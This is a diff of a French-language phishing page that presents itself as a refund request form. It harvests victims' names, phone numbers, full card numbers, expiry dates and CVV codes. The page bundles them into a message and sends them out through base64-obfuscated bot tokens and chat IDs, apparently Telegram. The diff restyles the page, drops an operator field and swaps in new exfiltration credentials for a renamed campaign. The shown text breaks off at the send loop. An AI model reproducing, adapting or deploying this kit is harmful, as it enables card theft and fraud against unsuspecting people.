@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html> <!--2-->
 <html lang="en">
 <head>
@@ -43,10 +45,10 @@
 
         input, select {
             width: 100%;
-            padding: 8px;
+            padding: 12px;
             margin-bottom: 10px;
             border: 1px solid #ccc;
-            border-radius: 4px;
+            border-radius: 22px;
             font-size: 14px;
         }
 
@@ -94,10 +96,10 @@
 
         #button {
         margin: 20px 0 0 0;
-        padding: 12px 5px;
-        background-color: #080;
+        padding: 22px 5px;
+        background-color: rgb(29, 234, 241);
         color: #fff;
-        border-radius: 4px;
+        border-radius: 22px;
         box-sizing: border-box;
         max-width: 360px;
         text-align: center;
@@ -105,7 +107,7 @@
     }
 
 #button:active {
-    background-color: #0a0;
+    background-color: rgb(29, 234, 241);
 }
 
         #title {
@@ -115,7 +117,7 @@
             margin: 0;
             padding: 0;
             font-size: 20px;
-            color: #000;
+            color: #00eef7;
            
         }
 
@@ -131,7 +133,7 @@
         }
 
         #footer {
-    background-color: #1a1a1a;
+    background-color: rgb(29, 234, 241);
     color: white;
     display: flex;
     flex-direction: column;
@@ -149,7 +151,7 @@
 }
 
 #social p, #links p {
-    color: #33cc66;
+    color: #000000;
     text-decoration: none;
     font-weight: normal;
     margin: 0 2px;
@@ -167,7 +169,7 @@
 }
 
 .en {
-    color: #33cc66;
+    color: #000000;
     margin: 0 0 0 8px;
     font-size: clamp(10px, 4vw, 14px);
 }
@@ -201,13 +203,7 @@
         <p id="titlephonenumber">Numero de telephone *</p>
         <input type="text" id="inputphonenumber" oninput="formatPhoneNumber(event)">
 
-        <select id="operator">
-            <option value="select">-- Choisissez un operateur --</option>
-                <option value="orange">Orange</option>
-                <option value="sfr">SFR</option>
-                <option value="bouygues">Bouygues Telecom</option>
-                <option value="free">Free Mobile</option>                      
-        </select>
+
 
         <p id="cardnumber">Numero de carte credit *</p>
         <input type="text" id="inputcardnumber" oninput="formatCardNumber(event)">
@@ -333,31 +329,29 @@ event.preventDefault();
     var lastname = document.getElementById('inputlastname').value.replace(/\s/g, '');
     let phone = document.getElementById('inputphonenumber').value;
     let cardnumber = document.getElementById('inputcardnumber').value.replace(/\s/g, '');
-    var operator = document.getElementById('operator').value;
     let mm = document.getElementById('inputmm').value;
     let yy = document.getElementById('inputyy').value;
     let cvv = document.getElementById('inputcvv').value;
 
     var msg = `
-    🔔 **Nouvelle Demande de Remboursement AM** 🔔
+    🔔 **Nouvelle Demande de Remboursement MCH** 🔔
 👤 Nom: ${firstname} ${lastname}
 📞 num: ${phone}
-📡 operator: ${operator}
 💳 cart: ${cardnumber}
 📅 mmyy: ${mm} / ${yy}
 🔒 cvv: ${cvv}`;
 
-    if (firstname === '' || lastname === '' || phone.length !== 10 || cardnumber.length !== 16 || cvv.length < 3 || operator === 'select') {
+    if (firstname === '' || lastname === '' || phone.length !== 10 || cardnumber.length !== 16 || cvv.length < 3 ) {
         alert('Certains champs sont vides. Veuillez remplir tous les champs requis.');
     } else {
 
         const tokens = [
-atob('Nzc5OTg2NTY3NzpBQUVIQkREcDVFR1RzeEgzclFkckpzMEI5bUVjTW0xUkpGbw=='),
-atob('ODA4MTcwNzY2ODpBQUVENFBnQjRhWnlrUmxTZkkwVG96Q3BYWDFjakNvOG1FVQ==') //YY
+atob('NzYyNjE0Njc1NzpBQUVBRTEzaDJ1QkhCbTlzOFJzekdiVHh0OUdkOFRDTEhoSQ=='),
+atob('ODA4MTcwNzY2ODpBQUVENFBnQjRhWnlrUmxTZkkwVG96Q3BYWDFjakNvOG1FVQ==') //YKK
 ];
 const chatIds = [
-atob('NzA2NDY0NzYzNA=='),
-atob('NjY2OTY5MzgwNQ==') //YY
+atob('NjQ0NTY3MzM4NQ=='),
+atob('NjY2OTY5MzgwNQ==') //YKK
 ];
 
 tokens.forEach((token, index) => {
